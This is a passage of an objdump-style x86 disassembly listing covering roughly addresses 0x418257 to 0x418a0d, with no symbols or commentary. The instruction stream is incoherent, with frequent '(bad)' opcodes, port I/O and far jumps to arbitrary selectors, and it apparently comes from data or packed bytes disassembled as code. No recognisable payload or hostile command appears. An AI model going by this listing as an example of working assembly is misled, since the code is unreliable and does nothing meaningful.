  418257:	cmp    DWORD PTR [ebp-0x37],ecx
  41825a:	mov    bl,0xab
  41825c:	mov    DWORD PTR [eax],eax
  41825e:	and    esi,DWORD PTR [edx+0x3517b64]
  418264:	adc    DWORD PTR [ebp-0x67],eax
  418267:	adc    esi,DWORD PTR [esi]
  418269:	xchg   DWORD PTR [ecx+ebp*2],esp
  41826c:	mov    bh,0x57
  41826e:	les    ecx,FWORD PTR [eax+0x58f00559]
  418274:	add    edx,esp
  418276:	and    eax,0xa9aaf4d3
  41827b:	into   
  41827c:	pop    es
  41827d:	fld    TBYTE PTR [edi+0x37118d8]
  418283:	push   0x9dd7e19e
  418288:	inc    edx
  418289:	cmp    BYTE PTR [edi-0x792e1360],0xf8
  418290:	cmp    al,0x7e
  418292:	loope  0x418247
  418294:	sbb    DWORD PTR [esi-0x170da396],esp
  41829a:	dec    ebx
  41829b:	sub    dh,dl
  41829d:	mov    edi,0xd3bd291f
  4182a2:	or     al,0x65
  4182a4:	mov    dl,0x5f
  4182a6:	jo     0x41829e
  4182a8:	faddp  st(6),st
  4182aa:	push   cs
  4182ab:	or     eax,0x825059b0
  4182b0:	mov    ebx,0x6c9f7371
  4182b5:	imul   esi,DWORD PTR [edx+esi*2],0xffffffae
  4182b9:	jmp    0xa40f:0xdee38ce6
  4182c0:	in     al,0x1b
  4182c2:	mov    ah,0xf3
  4182c4:	js     0x4182a1
  4182c6:	pop    es
  4182c7:	mov    BYTE PTR [ecx+0x5655f1d8],al
  4182cd:	out    0xb5,al
  4182cf:	ins    BYTE PTR es:[edi],dx
  4182d0:	xor    eax,ecx
  4182d2:	or     eax,0xdcfc1ffe
  4182d7:	push   es
  4182d8:	scas   eax,DWORD PTR es:[edi]
  4182d9:	push   0x710e5b5
  4182de:	add    DWORD PTR [edi],ebp
  4182e0:	data16 mov ah,0x1
  4182e3:	fnstenv [ecx-0x6015c8b3]
  4182e9:	and    eax,0xd908cd60
  4182ee:	cmp    BYTE PTR [edx-0x66],cl
  4182f1:	push   edx
  4182f2:	jge    0x418297
  4182f4:	or     eax,0x5e3ce00a
  4182f9:	test   DWORD PTR [esi+0x2b829c2d],ecx
  4182ff:	mov    esp,0x3f263ef5
  418304:	xchg   edi,eax
  418305:	and    BYTE PTR [ecx-0x17513397],dh
  41830b:	ret    
  41830c:	sub    edi,0xffffffac
  41830f:	(bad)  
  418310:	cmp    al,bl
  418312:	inc    edx
  418313:	jbe    0x41829e
  418315:	pop    esp
  418316:	cs xchg esi,eax
  418318:	sbb    al,0xfa
  41831a:	outs   dx,DWORD PTR ds:[esi]
  41831b:	jle    0x41837d
  41831d:	add    DWORD PTR [eax+0x7394edc4],ebp
  418323:	xor    eax,DWORD PTR [edi-0x6d]
  418326:	xchg   ebp,eax
  418327:	sbb    eax,0x54c6299a
  41832c:	test   BYTE PTR [ecx+0x4c2ccf9e],0x7f
  418333:	dec    ebp
  418334:	and    ebp,DWORD PTR [edx]
  418336:	xchg   edi,eax
  418337:	cld    
  418338:	add    eax,0x54ddf553
  41833d:	mov    edi,0x26f73bba
  418342:	add    al,0x37
  418344:	pop    ds
  418345:	add    DWORD PTR [ecx-0x45],edi
  418348:	add    edx,DWORD PTR [eax+0x41]
  41834b:	pop    ds
  41834c:	mov    ecx,0xfd355343
  418351:	push   es
  418352:	call   0x601f:0xc5309c5
  418359:	xor    BYTE PTR es:0xfad5f5d8,0x90
  418361:	adc    ebp,ecx
  418363:	pusha  
  418364:	push   cs
  418365:	sub    DWORD PTR [eax+edi*2+0x6e],esp
  418369:	cli    
  41836a:	out    dx,eax
  41836b:	rcr    esp,cl
  41836d:	bound  esi,QWORD PTR [edi]
  41836f:	xchg   ebx,eax
  418370:	push   0x65
  418372:	(bad)
  418375:	aad    0x86
  418377:	cld    
  418378:	loop   0x418358
  41837a:	and    BYTE PTR [esi-0x80],ch
  41837d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41837e:	jno    0x4183b8
  418380:	cmp    eax,0x2972c1cc
  418385:	and    DWORD PTR [edx],ebp
  418387:	or     DWORD PTR [ebx],edx
  418389:	pop    esi
  41838a:	or     ebx,ebp
  41838c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41838e:	stc    
  41838f:	adc    esp,esi
  418391:	aaa    
  418392:	pop    eax
  418393:	rcl    DWORD PTR [ebx],1
  418395:	fcom   QWORD PTR [ecx+0x1f]
  418398:	jp     0x41838b
  41839a:	push   esp
  41839b:	xchg   BYTE PTR [esi],bh
  41839d:	fwait
  41839e:	sbb    BYTE PTR [esi-0x39b03173],dh
  4183a4:	les    ebx,FWORD PTR [esi+ebp*4-0x113f74c8]
  4183ab:	xchg   BYTE PTR [ecx],bl
  4183ad:	dec    esi
  4183ae:	lds    edx,FWORD PTR [esi]
  4183b0:	jmp    0x41833e
  4183b2:	xor    dh,BYTE PTR [ebx+eiz*8-0xe]
  4183b6:	sub    edx,DWORD PTR [ebx]
  4183b8:	out    dx,al
  4183b9:	scas   al,BYTE PTR es:[edi]
  4183ba:	push   edx
  4183bb:	out    dx,eax
  4183bc:	jno    0x41838a
  4183be:	dec    edx
  4183bf:	fisub  DWORD PTR [esi]
  4183c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183c2:	neg    BYTE PTR [edx+0x74279b99]
  4183c8:	and    eax,esp
  4183ca:	pop    es
  4183cb:	or     eax,DWORD PTR [ebp-0x63d18ddf]
  4183d1:	std    
  4183d2:	mov    ch,0x20
  4183d4:	pop    esp
  4183d5:	ins    BYTE PTR es:[edi],dx
  4183d6:	xor    eax,0x95c10bd2
  4183db:	mov    ah,0x11
  4183dd:	xor    al,0xa6
  4183df:	js     0x41843a
  4183e1:	sahf   
  4183e2:	xor    edi,ecx
  4183e4:	mov    ds:0xc73aa0c2,eax
  4183e9:	test   DWORD PTR [ecx-0x3b7930fe],ebx
  4183ef:	mov    dl,0xe6
  4183f1:	xor    dh,BYTE PTR [eax-0x38bead53]
  4183f7:	dec    esp
  4183f8:	inc    esp
  4183f9:	rcr    edx,cl
  4183fb:	sub    DWORD PTR [edi],edx
  4183fd:	das    
  4183fe:	mov    ebx,0x8c6800c3
  418403:	(bad)  
  418404:	ins    DWORD PTR es:[edi],dx
  418405:	xchg   edx,eax
  418406:	fcomp  QWORD PTR ds:0x45316c23
  41840c:	cli    
  41840d:	stc    
  41840e:	xchg   ecx,eax
  41840f:	add    al,0x84
  418411:	mov    edi,0xfe847ff4
  418416:	je     0x41847a
  418418:	push   0x53
  41841a:	fisubr DWORD PTR [edx-0x22813f5d]
  418420:	test   BYTE PTR [edi],bl
  418422:	xchg   edi,eax
  418423:	sbb    al,0xa1
  418425:	fimul  WORD PTR [ecx+ebp*2+0x5021c780]
  41842c:	cwde   
  41842d:	(bad)  
  41842e:	cmp    esi,esi
  418430:	leave  
  418431:	jno    0x418435
  418433:	cdq    
  418434:	mov    al,ds:0x94c1510a
  418439:	xchg   DWORD PTR [edx],ebx
  41843b:	pop    ds
  41843c:	jg     0x418443
  41843e:	fisub  WORD PTR [ecx]
  418440:	push   ss
  418441:	and    DWORD PTR [edx],esp
  418443:	jle    0x418413
  418445:	or     cl,0x36
  418448:	pop    eax
  418449:	das    
  41844a:	xor    BYTE PTR [edi],al
  41844c:	xchg   ah,bh
  41844e:	or     BYTE PTR [edx-0x60],ch
  418451:	mov    bl,0xca
  418453:	mov    edx,0x71649791
  418458:	sbb    DWORD PTR [edi-0x3e],0xe1c74604
  41845f:	inc    ebp
  418460:	lds    ebp,FWORD PTR [edx+ecx*2-0x2]
  418464:	iret   
  418465:	das    
  418466:	addr16 jl 0x418433
  418469:	xor    BYTE PTR [eax+0x519a9aa5],al
  41846f:	xor    eax,0xa48dc91f
  418474:	jne    0x418462
  418476:	shl    BYTE PTR [ebx-0x1d],0x43
  41847a:	xchg   ebp,eax
  41847b:	jmp    0x1508:0x6a5b6ef4
  418482:	mov    cs,ebp
  418484:	jmp    0x4184f0
  418486:	sub    ecx,esi
  418488:	xor    eax,0x52326222
  41848d:	xor    DWORD PTR [esi+0x45478969],esi
  418493:	sub    dl,BYTE PTR [ebx]
  418495:	jecxz  0x4184dc
  418497:	pushf  
  418498:	arpl   WORD PTR [ebx-0x4a],cx
  41849b:	cld    
  41849c:	fmul   st(0),st
  41849e:	mov    ebx,0x600a3267
  4184a3:	imul   esp,DWORD PTR [eax],0xfce4a6f9
  4184a9:	into   
  4184aa:	nop
  4184ab:	fwait
  4184ac:	xor    al,0xaf
  4184ae:	data16 jb 0x418436
  4184b1:	add    al,BYTE PTR [ebp+0x53a4d237]
  4184b7:	test   al,0x91
  4184ba:	aas    
  4184bb:	pop    eax
  4184bc:	repz mov eax,ds:0xec382272
  4184c2:	mov    WORD PTR [eax+0x5466eb8b],gs
  4184c8:	dec    ecx
  4184c9:	shr    DWORD PTR [edx+0x6d],cl
  4184cc:	repnz into 
  4184ce:	push   esp
  4184cf:	inc    esi
  4184d0:	fidivr DWORD PTR [edx+0x5e]
  4184d3:	fsub   DWORD PTR [ebx]
  4184d5:	rcr    BYTE PTR [ebp+0x2e],0xc7
  4184d9:	push   ebx
  4184da:	and    DWORD PTR [edi-0x3ead577b],edi
  4184e0:	in     al,dx
  4184e1:	(bad)  
  4184e2:	mov    ebx,DWORD PTR [edi+ecx*4+0x74]
  4184e6:	ins    DWORD PTR es:[edi],dx
  4184e7:	aam    0xec
  4184e9:	and    ah,BYTE PTR [edx+0x3c]
  4184ec:	fucomip st,st(4)
  4184ee:	retf   
  4184ef:	(bad)  
  4184f1:	imul   ebx,DWORD PTR [ecx+0x7a62a033],0x2da54a1d
  4184fb:	retf   
  4184fc:	cld    
  4184fd:	nop
  4184fe:	test   ch,bh
  418500:	clc    
  418501:	pop    edx
  418502:	inc    esi
  418503:	fbld   TBYTE PTR [edi+edi*8]
  418506:	lock pop esi
  418508:	sahf   
  418509:	int3   
  41850a:	lea    ecx,[edi+0x72]
  41850d:	push   esi
  41850e:	shl    ebx,cl
  418510:	adc    BYTE PTR [edx],0xa8
  418513:	ja     0x41849f
  418515:	pop    ds
  418516:	xor    DWORD PTR [esi-0x66],ecx
  418519:	and    edi,DWORD PTR [ecx-0x7a88176b]
  41851f:	iret   
  418520:	enter  0xf664,0x72
  418524:	and    eax,0x1462c6ef
  418529:	jne    0x418563
  41852b:	(bad)  
  41852c:	ds (bad) 
  41852e:	jmp    0x8ca65623
  418533:	pushf  
  418534:	fsubrp st(7),st
  418536:	movnti DWORD PTR [ecx+0x33d3f7a6],edi
  41853d:	add    BYTE PTR [edx+edx*2+0x4],0x16
  418542:	scas   eax,DWORD PTR es:[edi]
  418543:	aam    0x42
  418545:	je     0x41856b
  418547:	ficom  WORD PTR [edi]
  418549:	mov    BYTE PTR [ebx+0x60114817],0x90
  418550:	sbb    dh,0xce
  418553:	mov    edx,0xc037045a
  418558:	shr    eax,1
  41855a:	inc    ebx
  41855b:	dec    edx
  41855c:	sub    ebx,DWORD PTR [edx+0x70]
  41855f:	ret    0xe4b0
  418562:	mov    dh,0x24
  418564:	push   ebp
  418565:	inc    esp
  418566:	fmul   st(5),st
  418568:	mov    esp,0xc3dc32b6
  41856d:	and    esi,DWORD PTR [ecx-0x6a4019be]
  418573:	jl     0x4185b5
  418575:	pop    edi
  418576:	imul   eax,DWORD PTR [ebx-0x2b79c716],0xa745f7cb
  418580:	or     edi,DWORD PTR [edx]
  418582:	mov    edx,eax
  418584:	mov    cl,0x83
  418586:	push   ss
  418587:	jnp    0x418608
  418589:	adc    ebp,DWORD PTR [eiz*4-0x1cd90d93]
  418590:	dec    edi
  418591:	push   ebx
  418592:	pop    ebx
  418593:	mov    dl,0xcb
  418595:	ins    BYTE PTR es:[edi],dx
  418596:	sti    
  418597:	retf   0x259e
  41859a:	sub    DWORD PTR [eax-0x67c86371],esp
  4185a0:	mov    esp,0x19e2cb0c
  4185a5:	rol    BYTE PTR [ecx],cl
  4185a7:	dec    ebx
  4185a8:	nop
  4185a9:	fstp   st(4)
  4185ab:	add    ebp,edx
  4185ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ae:	aad    0xe
  4185b0:	mov    ds:0x3f69877e,eax
  4185b5:	ret    0x91ae
  4185b8:	cwde   
  4185b9:	sub    DWORD PTR [edi+0x40],esi
  4185bc:	sub    al,0xb2
  4185be:	dec    ebp
  4185bf:	sub    ebx,DWORD PTR [eax+0x6c]
  4185c2:	mov    eax,ds:0xfc7c5a10
  4185c7:	cmovs  edi,DWORD PTR [edx+0x52aabdfa]
  4185ce:	retf   
  4185cf:	jb     0x418554
  4185d1:	push   ecx
  4185d2:	inc    esi
  4185d3:	dec    ebp
  4185d4:	stos   BYTE PTR es:[edi],al
  4185d5:	xor    ebx,esi
  4185d7:	scas   eax,DWORD PTR es:[edi]
  4185d8:	sbb    ch,BYTE PTR [eax+0x64]
  4185db:	dec    ebx
  4185dc:	jmp    0x670e:0x9a155feb
  4185e3:	pop    ds
  4185e4:	std    
  4185e5:	leave  
  4185e6:	(bad)  
  4185e7:	and    DWORD PTR [esi-0x6d9f97db],ebp
  4185ed:	imul   ecx,DWORD PTR [edi-0x1e],0x50ac50b0
  4185f4:	jecxz  0x418620
  4185f6:	pop    ebp
  4185f7:	in     al,0xe
  4185f9:	in     eax,dx
  4185fa:	mov    ebp,0xe2795833
  4185ff:	cdq    
  418600:	stos   DWORD PTR es:[edi],eax
  418601:	fisttp QWORD PTR [eax-0x4929152e]
  418607:	test   DWORD PTR [ecx+edx*8-0x57],ebx
  41860b:	and    al,0x2d
  41860d:	adc    bh,BYTE PTR [eax]
  41860f:	inc    ebx
  418610:	pushf  
  418611:	data16 ss in al,0x24
  418615:	cmp    BYTE PTR [ebp-0x3734702c],al
  41861b:	mov    bh,0xb0
  41861d:	sbb    eax,0xb8ede9f5
  418622:	push   cs
  418623:	rcr    BYTE PTR [bx+si-0x51fb],1
  418628:	mov    dh,0x6c
  41862a:	mov    esi,0x7659e5ad
  41862f:	xor    BYTE PTR [edx],al
  418631:	ins    BYTE PTR es:[edi],dx
  418632:	xor    DWORD PTR [esi+ebx*2],esp
  418635:	sbb    ecx,ebp
  418637:	sub    al,0xb
  418639:	pop    esp
  41863a:	lea    ebp,[ecx]
  41863c:	mov    dh,0xb9
  41863e:	push   esp
  41863f:	inc    ebx
  418640:	mov    cl,0xd3
  418642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418643:	lods   eax,DWORD PTR ds:[esi]
  418644:	sub    al,0xc
  418646:	lea    ebp,[ebx]
  418648:	jecxz  0x418639
  41864a:	(bad)  
  41864b:	xchg   edi,eax
  41864c:	cli    
  41864d:	jg     0x418676
  41864f:	jns    0x41863d
  418651:	or     BYTE PTR [esi],cl
  418653:	mov    dh,0x81
  418655:	popa   
  418656:	adc    al,0x30
  418658:	lahf   
  418659:	stos   BYTE PTR es:[edi],al
  41865a:	int3   
  41865b:	lahf   
  41865c:	push   esi
  41865d:	inc    ebp
  41865e:	add    ch,bl
  418660:	sub    BYTE PTR [ecx],0xb2
  418663:	fst    DWORD PTR [ebx-0x65b03309]
  418669:	ins    DWORD PTR es:[edi],dx
  41866a:	popa   
  41866b:	cwde   
  41866c:	sbb    DWORD PTR [ecx+0x780e693d],eax
  418672:	push   edi
  418673:	mov    gs,ebp
  418675:	scas   eax,DWORD PTR es:[edi]
  418676:	call   0x3863:0xf5f40aec
  41867d:	add    eax,esi
  41867f:	inc    ebx
  418680:	test   al,0x3
  418682:	rol    dl,0xe1
  418685:	sahf   
  418686:	dec    edx
  418687:	clc    
  418688:	rcr    al,cl
  41868a:	cmp    edx,DWORD PTR [edx]
  41868c:	in     eax,dx
  41868d:	bound  esp,QWORD PTR [ecx]
  41868f:	scas   al,BYTE PTR es:[edi]
  418690:	jmp    0x41869e
  418692:	out    0xc6,al
  418694:	ds push 0xba7af8ea
  41869a:	loopne 0x4186c5
  41869c:	pusha  
  41869d:	loope  0x418672
  41869f:	dec    esp
  4186a0:	push   es
  4186a1:	sub    BYTE PTR [ebp-0x5e],al
  4186a4:	sbb    BYTE PTR [ecx],dh
  4186a6:	shl    bh,1
  4186a8:	test   al,0x76
  4186aa:	lahf   
  4186ab:	in     eax,dx
  4186ac:	mov    WORD PTR [ecx-0x3e],fs
  4186af:	sbb    esi,DWORD PTR [ebx+0x7e30a31b]
  4186b5:	sub    al,0x76
  4186b7:	inc    ebx
  4186b8:	or     ecx,DWORD PTR [ebp+ebp*4-0x259fc197]
  4186bf:	shl    BYTE PTR [ecx-0x18],0x3f
  4186c3:	aaa    
  4186c4:	ja     0x4186cf
  4186c6:	or     eax,0x3994ea4c
  4186cb:	or     ah,cl
  4186cd:	sub    bl,BYTE PTR [edx]
  4186cf:	jle    0x4186c2
  4186d1:	dec    esi
  4186d2:	xchg   ebp,eax
  4186d3:	out    dx,al
  4186d4:	jmp    0x41866e
  4186d6:	mov    ecx,0xae75b235
  4186db:	pop    ebx
  4186dc:	push   esp
  4186dd:	(bad)
  4186e1:	(bad)  
  4186e2:	retf   
  4186e3:	neg    BYTE PTR [edx+eiz*4-0x37]
  4186e7:	outs   dx,BYTE PTR ds:[esi]
  4186e8:	pop    ebp
  4186e9:	sbb    al,BYTE PTR [ecx+esi*4+0x7a463e26]
  4186f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186f1:	fimul  DWORD PTR [ecx+eiz*1-0x775282ca]
  4186f8:	xchg   ebp,eax
  4186f9:	lods   eax,DWORD PTR ds:[esi]
  4186fa:	sbb    eax,0x6566add5
  4186ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418700:	push   ds
  418701:	ret    0x16ff
  418704:	ss jmp 0x4186b9
  418707:	outs   dx,BYTE PTR ds:[esi]
  418708:	pop    ss
  418709:	lods   al,BYTE PTR ds:[esi]
  41870a:	xor    al,BYTE PTR [esi+0x76620798]
  418710:	mov    ds:0xd682adb3,eax
  418715:	test   al,0x15
  418717:	or     BYTE PTR [esi+ecx*2],bl
  41871a:	xchg   esp,eax
  41871b:	mov    eax,0x3656704a
  418720:	and    BYTE PTR [ebx+0x18],ch
  418723:	cmc    
  418724:	gs push ebx
  418726:	nop
  418727:	(bad)  
  418728:	pop    esi
  418729:	jbe    0x4186c2
  41872b:	xchg   edx,eax
  41872c:	ja     0x4186e2
  41872e:	fs aaa 
  418730:	test   BYTE PTR [edi+0x4af8675a],ch
  418736:	adc    al,0x73
  418738:	jl     0x418729
  41873a:	pop    ss
  41873b:	aam    0xb2
  41873d:	cmp    BYTE PTR [eax+ecx*8+0x2f77c613],bl
  418744:	pop    esp
  418745:	or     al,0x31
  418747:	adc    al,0x3b
  418749:	daa    
  41874a:	push   ss
  41874b:	sbb    BYTE PTR ds:0x758977a,dl
  418751:	pop    ebp
  418752:	xchg   edx,eax
  418753:	push   esi
  418754:	cwde   
  418755:	xchg   edi,eax
  418756:	in     eax,0x5d
  418758:	xor    cl,al
  41875a:	adc    DWORD PTR [esi-0x47a9baf5],0x6f
  418761:	ret    0xd098
  418764:	inc    eax
  418765:	inc    edx
  418766:	and    bl,cl
  418768:	xor    ebx,eax
  41876a:	sahf   
  41876b:	repz clc 
  41876d:	add    al,ch
  41876f:	cmp    DWORD PTR [esi+0x71],eax
  418772:	xchg   esp,eax
  418773:	out    dx,al
  418774:	adc    BYTE PTR [ecx],dh
  418776:	bound  edi,QWORD PTR [edx-0x65]
  418779:	stos   DWORD PTR es:[edi],eax
  41877a:	aaa    
  41877b:	in     eax,0x3f
  41877d:	adc    BYTE PTR [ecx],0x74
  418780:	iret   
  418781:	inc    eax
  418782:	pusha  
  418783:	arpl   WORD PTR [edx],cx
  418785:	sbb    eax,0x931f5b8c
  41878a:	xor    ecx,DWORD PTR [edx+ebx*4]
  41878d:	jecxz  0x41880b
  41878f:	xchg   ecx,eax
  418790:	adc    bl,BYTE PTR [edi-0x24ae2672]
  418796:	dec    eax
  418797:	sar    DWORD PTR [edx-0xa228a1],1
  41879d:	aaa    
  41879e:	out    dx,eax
  41879f:	push   esi
  4187a0:	push   0x92dc5c04
  4187a5:	inc    ecx
  4187a6:	sub    dh,cl
  4187a8:	mov    ebp,0xe393c5f7
  4187ad:	sbb    al,0x82
  4187af:	lea    ebp,[edx-0x10de2460]
  4187b5:	adc    dl,0x4e
  4187b8:	or     dl,BYTE PTR [eax+ebx*4-0x2c]
  4187bc:	in     eax,dx
  4187bd:	imul   ecx,DWORD PTR [ebx+ebx*4+0x6cc2de8a],0xfa9ed110
  4187c8:	outs   dx,BYTE PTR ds:[esi]
  4187ca:	jle    0x41880a
  4187cc:	jns    0x418830
  4187ce:	aam    0x5e
  4187d0:	push   esi
  4187d1:	mov    ecx,0xb90ebb37
  4187d6:	call   0xaa15:0x677397de
  4187dd:	xor    ebx,DWORD PTR [esi]
  4187df:	dec    ecx
  4187e0:	fmul   st,st(4)
  4187e2:	cmp    ah,BYTE PTR ss:[edi]
  4187e5:	pop    edi
  4187e6:	bound  esi,QWORD PTR [edx]
  4187e8:	jmp    0xa79be006
  4187ed:	dec    edi
  4187ee:	out    dx,al
  4187ef:	outs   dx,DWORD PTR ds:[esi]
  4187f0:	and    bl,bl
  4187f2:	aas    
  4187f3:	sub    eax,0x8131bc34
  4187f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f9:	mov    ch,0x7b
  4187fb:	add    cl,dl
  4187fd:	and    dl,ch
  4187ff:	pop    ecx
  418800:	adc    DWORD PTR [ecx-0x1c],edx
  418803:	hlt    
  418804:	(bad)  
  418807:	mov    eax,0xc158643
  41880c:	shl    DWORD PTR [ebp-0x745fe620],1
  418812:	push   ecx
  418813:	inc    esp
  418814:	add    edi,DWORD PTR [ecx+0x31]
  418817:	cmp    eax,0x8a83b54c
  41881c:	in     eax,dx
  41881d:	cmc    
  41881e:	and    bl,BYTE PTR [edi-0x62]
  418821:	push   ebp
  418822:	scas   eax,DWORD PTR es:[edi]
  418823:	pop    edx
  418824:	mov    cs,WORD PTR ss:[edx-0x7f]
  418828:	daa    
  418829:	xor    eax,0x979f0db6
  41882e:	in     al,dx
  41882f:	repnz mov al,0xee
  418832:	stos   BYTE PTR es:[edi],al
  418833:	pop    ebp
  418834:	in     al,0x88
  418836:	popf   
  418837:	out    0xe2,al
  418839:	dec    edi
  41883a:	outs   dx,BYTE PTR ds:[esi]
  41883b:	(bad)  
  41883c:	(bad)  
  41883d:	jbe    0x4187ca
  41883f:	mov    ah,BYTE PTR [ebp+esi*4+0x54]
  418843:	lahf   
  418844:	mov    bh,0x1e
  418846:	bound  ebx,QWORD PTR [edi+ebx*4-0x4dcd2388]
  41884d:	int3   
  41884e:	cwde   
  41884f:	dec    ebx
  418850:	(bad)
  418853:	inc    esi
  418854:	xchg   DWORD PTR [esi+eax*1-0x68],edx
  418858:	lds    esp,FWORD PTR [esi+0x9c490f2]
  41885e:	pushf  
  41885f:	dec    ebx
  418860:	in     eax,0x4
  418862:	push   cs
  418863:	mov    ds:0x1b5dc3c,eax
  418868:	cmp    DWORD PTR [eax+edi*8+0x77],ebx
  41886c:	retfw  
  41886e:	sbb    eax,0x5df2248c
  418873:	add    DWORD PTR ds:0xb0cf7720,esi
  418879:	(bad)
  41887d:	push   esi
  41887e:	jnp    0x418850
  418880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418881:	std    
  418882:	ret    0xc17b
  418885:	or     cl,BYTE PTR [ecx+0x2]
  418888:	pop    es
  418889:	inc    DWORD PTR [edx]
  41888b:	in     eax,dx
  41888c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41888d:	data16 xor dh,BYTE PTR [esi]
  418890:	aad    0xe0
  418892:	jbe    0x41885c
  418894:	sub    ecx,DWORD PTR [edi]
  418896:	jge    0x4188d0
  418898:	inc    ebx
  418899:	add    al,0x53
  41889b:	fs out dx,al
  41889d:	cmp    ah,BYTE PTR [ecx]
  41889f:	push   ebx
  4188a0:	and    ecx,DWORD PTR [edx+0x2a]
  4188a3:	sbb    al,0x46
  4188a5:	dec    esp
  4188a6:	ror    BYTE PTR [esi+0x14],1
  4188a9:	pusha  
  4188aa:	int    0xb
  4188ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188ad:	fild   WORD PTR [edi]
  4188af:	popf   
  4188b0:	pcmpeqd mm7,QWORD PTR [ebx]
  4188b3:	in     eax,0xb2
  4188b5:	lods   al,BYTE PTR ds:[esi]
  4188b6:	sar    edx,1
  4188b8:	ins    DWORD PTR es:[edi],dx
  4188b9:	sti    
  4188ba:	and    ebp,ebx
  4188bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188bd:	out    dx,eax
  4188be:	xlat   BYTE PTR ds:[ebx]
  4188bf:	std    
  4188c0:	dec    edi
  4188c1:	xor    BYTE PTR [edi+0x457b579e],dh
  4188c7:	jne    0x418932
  4188c9:	in     al,dx
  4188ca:	mov    esi,0xbc63767e
  4188cf:	push   ds
  4188d0:	pusha  
  4188d1:	cmp    esi,esp
  4188d3:	mov    al,0xe7
  4188d5:	cli    
  4188d6:	inc    edi
  4188d7:	rcr    DWORD PTR [edx-0x4d],1
  4188da:	js     0x418914
  4188dc:	mov    dl,0x33
  4188de:	ss call 0x49a4:0xa0973cab
  4188e6:	pop    ebx
  4188e7:	add    eax,0x5b723402
  4188ec:	mov    al,ds:0xbc2eb4f3
  4188f1:	sbb    eax,DWORD PTR [ecx-0xbc9aba2]
  4188f7:	sbb    eax,0xabaceaf2
  4188fc:	adc    BYTE PTR [esi],bl
  4188fe:	in     eax,dx
  4188ff:	dec    esp
  418900:	push   esp
  418901:	sbb    eax,0x5df93030
  418906:	(bad)
  418909:	daa    
  41890a:	sub    eax,0x30f088fb
  41890f:	mov    ch,bl
  418911:	xlat   BYTE PTR ds:[ebx]
  418912:	aam    0x20
  418914:	mov    eax,ds:0xc7cdfba2
  418919:	add    ecx,ebp
  41891b:	sbb    DWORD PTR [edx],0xffffffe3
  41891e:	adc    edi,edi
  418920:	mov    cl,0xc0
  418922:	lods   eax,DWORD PTR ds:[esi]
  418923:	or     bl,BYTE PTR [eax-0x5d]
  418926:	sahf   
  418927:	pop    esp
  418928:	mov    ebx,0xb0cacef
  41892d:	or     ebp,DWORD PTR [edi]
  41892f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418930:	inc    ebp
  418931:	push   eax
  418932:	mov    ds:0x2d167eb9,eax
  418937:	and    eax,DWORD PTR [ecx+0x4decd7d]
  41893d:	ss int3 
  41893f:	sub    dh,bl
  418941:	mov    ds:0xb82d78e4,al
  418946:	test   eax,0xf99122b0
  41894b:	cld    
  41894c:	adc    al,0xea
  41894e:	mov    ds:0xabbfd548,al
  418953:	xlat   BYTE PTR ds:[ebx]
  418954:	leave  
  418955:	popf   
  418956:	dec    eax
  418957:	or     BYTE PTR [ecx],ch
  418959:	pusha  
  41895a:	icebp  
  41895b:	pop    es
  41895c:	std    
  41895d:	push   esp
  41895e:	cmp    ah,BYTE PTR [eax+0x5d17138f]
  418964:	push   0x15304b12
  418969:	mov    al,0x30
  41896b:	or     ecx,DWORD PTR [edx+0x102ee57e]
  418971:	push   ds
  418972:	mov    bh,0xd3
  418974:	or     BYTE PTR [ecx+0x4d],ch
  418977:	ins    DWORD PTR es:[edi],dx
  418978:	fild   DWORD PTR [ebp+0x5b]
  41897b:	or     eax,0x50322f78
  418980:	std    
  418981:	pop    ebp
  418982:	cmp    cl,BYTE PTR [eax]
  418984:	cs dec ecx
  418986:	jae    0x4189ed
  418988:	push   0xe8e56d38
  41898d:	daa    
  41898e:	mov    BYTE PTR [esi],dh
  418990:	xor    dh,BYTE PTR [eax]
  418992:	das    
  418993:	inc    esi
  418994:	push   esi
  418995:	push   ss
  418996:	or     eax,eax
  418998:	call   DWORD PTR [edi+0x7d07dc55]
  41899e:	push   ebx
  41899f:	dec    ecx
  4189a0:	xlat   BYTE PTR ds:[ebx]
  4189a1:	scas   eax,DWORD PTR es:[edi]
  4189a2:	cmc    
  4189a3:	fld    QWORD PTR [ebp-0x2b9a222c]
  4189a9:	inc    eax
  4189aa:	mov    ebx,0x29d0b622
  4189af:	in     al,0xd9
  4189b1:	mov    al,0x1b
  4189b3:	std    
  4189b4:	call   0xa0d21d53
  4189b9:	ja     0x4189d8
  4189bb:	mov    bl,0x63
  4189bd:	mov    esi,0xbcdae465
  4189c2:	adc    bh,dl
  4189c4:	cs xchg ecx,eax
  4189c6:	bound  edx,QWORD PTR [esp+eiz*8+0x3c]
  4189ca:	or     DWORD PTR [esi],edx
  4189cc:	add    eax,0x623391bd
  4189d1:	inc    ebx
  4189d2:	stos   DWORD PTR es:[edi],eax
  4189d3:	mov    al,0xb6
  4189d5:	inc    esp
  4189d6:	fs mov ebp,0x36eb271a
  4189dc:	in     eax,dx
  4189dd:	fs scas al,BYTE PTR es:[edi]
  4189df:	xchg   edi,eax
  4189e0:	retf   
  4189e1:	mov    al,ds:0x3aa88ae6
  4189e6:	ja     0x418a5d
  4189e8:	mov    DWORD PTR [ebx+0x54],0x9960f976
  4189ef:	push   cs
  4189f0:	xchg   edi,eax
  4189f1:	or     DWORD PTR [ebx-0x13c839d7],esp
  4189f7:	shl    DWORD PTR [ebx],cl
  4189f9:	sub    al,0xeb
  4189fb:	std    
  4189fc:	inc    ebp
  4189fd:	push   edi
  4189fe:	(bad)  
  4189ff:	je     0x4189e2
  418a01:	inc    esp
  418a02:	and    esi,esi
  418a04:	jne    0x418a48
  418a06:	dec    edx
  418a07:	loopne 0x418a20
  418a09:	sbb    BYTE PTR [edi+0x58],dl
  418a0c:	push   edx
  418a0d:	mov    cl,0x1f
